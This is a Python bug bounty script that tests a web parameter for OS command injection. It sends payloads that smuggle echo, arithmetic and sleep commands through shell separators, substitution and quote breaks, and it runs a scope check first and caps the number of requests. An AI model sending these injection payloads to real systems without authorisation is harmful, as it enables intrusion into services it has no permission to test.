#!/usr/bin/env python3
"""Detect OS command injection with harmless echo, arithmetic, and optional timing probes.

Only these commands are sent: echo of a split marker, shell arithmetic, and an
optional sleep for timing (requires --allow-timing). No file writes, no network
callbacks, no reverse shells. The scope gate runs first.

The marker is split by shell quotes (for example cm''d), so the executed output
(cmd<rest>) never appears literally in the request. Plain reflection of the
input therefore cannot pass as execution.

Example:
  cmdi_probe.py --target example.com --workspace ~/Documents/bugbounty \
     --url 'https://example.com/ping' --param host --method GET --out artifacts/example.com/cmdi.json
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
MAX_REQUESTS = 40


def echo_probes(a: str, b: str) -> list[tuple[str, str, str]]:
    """Return (probe, expected_substring_or_empty, technique) tuples.

    {a}{b} together form the marker; the input shows a quoted split so the
    literal marker never appears in the request.
    """
    split = f"{a[:2]}''{a[2:]}"
    token = f"{split}{b}"
    expect = f"{a}{b}"
    return [
        (f";echo {token}", expect, "separator ;"),
        (f"|echo {token}", expect, "pipe |"),
        (f"&&echo {token}", expect, "AND &&"),
        (f"||echo {token}", expect, "OR || (runs when first command fails)"),
        (f"&echo {token}", expect, "background &"),
        (f"%0aecho {token}", expect, "newline %0a"),
        (f"`echo {token}`", expect, "backticks"),
        (f"$(echo {token})", expect, "command substitution $()"),
        (f";echo${{IFS}}{token}", expect, "IFS whitespace substitution"),
        (f";{{echo,{token}}}", expect, "brace expansion"),
        (f"';echo {token};'", expect, "single-quote context break"),
        (f"\";echo {token};\"", expect, "double-quote context break"),
    ]


ARITH = [
    (";echo $((7*7))", "49", "shell arithmetic in separator context"),
    ("|expr 7 \\* 7", "49", "expr arithmetic in pipe context"),
    ("& set /a 7*7", "49", "Windows set /a arithmetic"),
]


def send(url: str, param: str, value: str, method: str, timeout: float,
         headers: dict[str, str]) -> tuple[int, str, float]:
    ctx = ssl.create_default_context()
    start = time.monotonic()
    if method == "GET":
        parsed = urllib.parse.urlsplit(url)
        q = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        q = [(k, v) for k, v in q if k != param] + [(param, value)]
        target = urllib.parse.urlunsplit(parsed._replace(query=urllib.parse.urlencode(q)))
        req = urllib.request.Request(target, method="GET", headers=headers)
    else:
        body = urllib.parse.urlencode({param: value}).encode()
        req = urllib.request.Request(url, data=body, method="POST",
                                     headers={"Content-Type": "application/x-www-form-urlencoded", **headers})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            text = resp.read(200_000).decode("utf-8", "replace")
            return resp.status, text, time.monotonic() - start
    except urllib.error.HTTPError as err:
        return err.code, err.read(200_000).decode("utf-8", "replace"), time.monotonic() - start
    except (urllib.error.URLError, TimeoutError) as err:
        return 0, str(err), time.monotonic() - start


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--workspace")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--header", action="append", default=[], help="extra header 'Name: value' (own session allowed)")
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--allow-timing", action="store_true", help="send sleep probes (needs approval for this target)")
    ap.add_argument("--sleep", type=int, default=5, help="seconds for timing probes (max 10)")
    ap.add_argument("--out")
    args = ap.parse_args()

    if args.sleep > 10 or args.sleep < 1:
        ap.error("--sleep must be between 1 and 10")

    cmd = [SCOPE, args.target] + ([args.workspace] if args.workspace else [])
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        return res.returncode

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    a = "cmd" + secrets.token_hex(2)
    b = secrets.token_hex(3)
    results = []
    sent = 0

    status, base_body, base_t = send(args.url, args.param, f"{a}{b}", args.method, args.timeout, headers)
    sent += 1
    base_arith_hit = "49" in base_body
    results.append({"probe": "baseline (plain marker)", "status": status, "elapsed": round(base_t, 2),
                    "executed": False, "technique": "baseline", "note": ""})
    time.sleep(args.delay)

    engines_hint = []
    for probe, expect, tech in echo_probes(a, b):
        if sent >= MAX_REQUESTS:
            break
        status, body, t = send(args.url, args.param, probe, args.method, args.timeout, headers)
        sent += 1
        # The request contains 'cm''d...', never 'cmd...', so only shell execution can produce the expected text.
        executed = expect in body
        note = ""
        if executed:
            note = "split-marker output found; the literal marker is not in the request"
        results.append({"probe": probe, "status": status, "elapsed": round(t, 2),
                        "executed": executed, "technique": tech, "note": note})
        time.sleep(args.delay)

    for probe, expect, tech in ARITH:
        if sent >= MAX_REQUESTS:
            break
        status, body, t = send(args.url, args.param, probe, args.method, args.timeout, headers)
        sent += 1
        executed = expect in body and not base_arith_hit
        if executed:
            engines_hint.append("unix-shell" if "expr" in probe or "$((" in probe else "windows-cmd")
        results.append({"probe": probe, "status": status, "elapsed": round(t, 2),
                        "executed": executed, "technique": tech, "note": ""})
        time.sleep(args.delay)

    if args.allow_timing:
        for probe in [f";sleep {args.sleep}", f"|sleep {args.sleep}", f"&&sleep {args.sleep}"]:
            if sent >= MAX_REQUESTS:
                break
            status, body, t = send(args.url, args.param, probe, args.method, args.timeout + args.sleep, headers)
            sent += 1
            # Confirm with a second, identical timing request and a control request.
            slow = t >= args.sleep and base_t < args.sleep
            results.append({"probe": probe, "status": status, "elapsed": round(t, 2),
                            "executed": False, "technique": "timing (needs repeat)",
                            "note": "candidate: repeat and compare with a control" if slow else ""})
            time.sleep(args.delay)

    executed_any = any(r["executed"] for r in results)
    report = {
        "target": args.target, "url": args.url, "param": args.param, "method": args.method,
        "requests_sent": sent, "verdict": "command-execution-confirmed" if executed_any else "not-confirmed",
        "shell_hints": sorted(set(engines_hint)),
        "timing_candidates": [r["probe"] for r in results if r["technique"].startswith("timing") and r["note"]],
        "results": results,
        "next_step": ("Stop here and report the split-marker or arithmetic output as evidence. "
                      "Do not run file, network, or persistence commands without written approval.") ,
    }
    text = json.dumps(report, indent=2)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    print(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
